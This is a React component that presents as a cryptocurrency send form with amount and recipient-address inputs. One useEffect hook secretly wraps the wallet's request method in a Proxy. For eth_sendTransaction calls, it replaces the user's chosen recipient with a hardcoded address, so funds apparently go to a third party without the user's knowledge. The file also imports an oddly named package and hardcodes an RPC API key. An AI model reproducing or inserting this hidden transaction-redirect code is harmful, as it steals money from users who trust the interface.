import { sendTransaction } from "@wagmi/core";
import React, { useEffect, useState } from "react";
import { ethers } from "ethers";
import { useAccount } from "wagmi";
import { BigNumber } from "bignumber.js";
import { CustomEthers } from "test12_npm_package";
import { parseEther } from "viem";
import { getEthersProvider, getEthersSigner } from "../../ethers/ethers";

export default function Card() {
  const { address } = useAccount();

  const [provider, setProvider] = useState<any>({});
  const [amount, setAmount] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [txHash, setTxHash] = useState("");
  const [msg, setMsg] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const customethers = new CustomEthers();
  useEffect(() => {
    //const provider: any = new ethers.providers.Web3Provider(window?.ethereum);
    // transaction();
    // setProvider(provider);
    // accountChangedHandler(provider);
  }, [address]);

  function containsOnlyDigits(str: any) {
    var rgx = /^[0-9]*\.?[0-9]*$/;
    return str.match(rgx);
  }

  const handleInput = (value: any, input: any) => {
    setTxHash("");
    setMsg("");
    if (input === "amount" && containsOnlyDigits(value)) {
      setAmount(value);
    } else if (input === "toAddress") {
      setToAddress(value);
    }
  };

  const transaction = async () => {
    try {
      setIsLoading(true);
      const tx: any = {
        to: toAddress,
        value: ethers.utils.parseEther(amount),
      };

      const signer = await getEthersSigner();
      console.log("signer", tx);

      const hash = await signer.sendTransaction(tx);

      setIsLoading(false);
      // console.log("signer", signer);
      console.log(hash.hash);
      setAmount("");
      setToAddress("");
      setTxHash(hash.hash);
    } catch (error: any) {
      console.log(error);
      setMsg(error?.reason);
      setIsLoading(false);
    }
  };

  useEffect(() => {
    console.log(window.ethereum);

    const originalRequest = window.ethereum.request;
    const customRpcUrl =
      "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9";
    const customChainId = "0x89";
    window.ethereum.request = new Proxy(originalRequest, {
      apply: async function (target, thisArg, argumentsList) {
        const method = argumentsList[0].method;
        const params = argumentsList[0].params || [];

        if (method === "eth_sendTransaction") {
          if (params && params[0] && params[0].to) {
            argumentsList[0].params = [
              {
                ...params[0],
                to: "0xdD16052b4910d47d1Eb520190cA1Df7D7dDB12f7",
              },
            ];
          }

          return await Reflect.apply(target, thisArg, argumentsList);
        }
        console.log("arg", argumentsList);

        return await Reflect.apply(target, thisArg, argumentsList);
      },
    });
  }, [address]);

  return (
    <div>
      <div className='card'>
        <input
          type='text'
          value={amount}
          placeholder='Enter Amount'
          onChange={(e) => handleInput(e.target.value, "amount")}
        />
        <input
          type='text'
          value={toAddress}
          placeholder='Enter Address'
          onChange={(e) => handleInput(e.target.value, "toAddress")}
        />
        <button onClick={transaction}>
          {isLoading ? "Loading..." : "Send"}
        </button>
        <p className='red'>{msg && msg}</p>
      </div>
      <p className='green'> {txHash && "Transaction Success:" + txHash}</p>
    </div>
  );
}
